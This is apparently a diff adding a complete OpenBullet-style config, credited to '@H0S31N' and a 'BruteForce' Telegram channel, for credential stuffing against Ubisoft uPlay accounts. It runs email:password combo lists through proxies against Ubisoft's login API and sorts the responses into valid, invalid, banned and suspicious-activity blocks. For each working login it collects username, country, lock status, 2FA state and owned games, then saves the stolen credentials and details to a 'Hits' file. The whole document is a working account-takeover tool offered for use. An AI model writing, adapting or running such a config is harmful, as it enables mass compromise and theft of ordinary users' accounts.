@@ -1,0 +1,139 @@
+[SETTINGS]
+{
+  "Name": "uPlay.Com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-07T20:33:49.4478109+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Capture | Save Hits With Capture | ",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#ENC FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "ENC" 
+
+#LOGIN REQUEST POST "https://public-ubiservices.ubi.com/v3/profiles/sessions" AutoRedirect=FALSE 
+  CONTENT "{\"rememberMe\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: public-ubiservices.ubi.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://connect.ubisoft.com" 
+  HEADER "Authorization: Basic <ENC>" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "Ubi-AppId: e06033f4-28a4-43fb-8313-6c2d882bc4a6" 
+  HEADER "Referer: https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=fr-FR&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "ticket" 
+  KEYCHAIN Ban OR 
+    KEY "errorCode\":1101" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Authentication forbidden because of suspicious activity" 
+
+#PID PARSE "<SOURCE>" JSON "userId" -> VAR "PID" 
+
+#KON PARSE "<SOURCE>" JSON "ticket" -> VAR "KON" 
+
+REQUEST GET "https://public-ubiservices.ubi.com/v3/users/<PID>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Ubi_v1 t=<KON>" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "Ubi-AppId: e06033f4-28a4-43fb-8313-6c2d882bc4a6" 
+  HEADER "Referer: https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=fr-FR&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "pendingActivation" 
+
+#UserName PARSE "<SOURCE>" JSON "username" -> CAP "UserName" 
+
+#Country PARSE "<SOURCE>" JSON "country" -> CAP "Country" 
+
+#Status PARSE "<SOURCE>" JSON "generalStatus" -> CAP "General Status" 
+
+#locked PARSE "<SOURCE>" JSON "locked" -> CAP "Locked" 
+
+#Check_2FA REQUEST GET "https://connect.ubisoft.com/api/default/check2fa" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Ubi_v1 t=<KON>" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "Ubi-AppId: e06033f4-28a4-43fb-8313-6c2d882bc4a6" 
+  HEADER "Referer: https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=fr-FR&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html" 
+
+#2FA PARSE "<SOURCE>" JSON "active" -> CAP "2FA" 
+
+#GetCap REQUEST GET "https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/<PID>/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Ubi_v1 t=<KON>" 
+
+#Number_Of_Games PARSE "<SOURCE>" JSON "TotalCount" -> CAP "Number Of Games" 
+
+#Platforms PARSE "<SOURCE>" JSON "PlatformCode" Recursive=TRUE -> CAP "Platforms" 
+
+#KIR3 PARSE "<SOURCE>" JSON "Name" Recursive=TRUE -> VAR "KIR3" 
+
+#Games_List FUNCTION Replace "," " / " "<KIR3>" -> CAP "Games List" 
+
+#R1 FUNCTION Replace "[" "" "<Games List>" -> VAR "R1" 
+
+#R2 FUNCTION Replace "]" "" "<R1>" -> VAR "R2" 
+
+#R3 FUNCTION Replace " / " "\\n" "<R2>" -> VAR "R3" 
+
+#Save UTILITY File "uPlay Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail\\Username: <USER> \\nPassword: <PASS>\\n<<<<<<<<<<=INFO=>>>>>>>>>>\\nUserName: <UserName>\\nCountry: <Country>\\nGeneral Status: <General Status>\\nLocked: <Locked>\\n\\nNumber Of Games: <Number Of Games>\\nPlatforms: <Platforms>\\n=======Games List=======\\n <R3>\\n\\n\\nTelegram Channel: T.me/BruteForce\\n==============================================================" -> VAR "Save" 
+
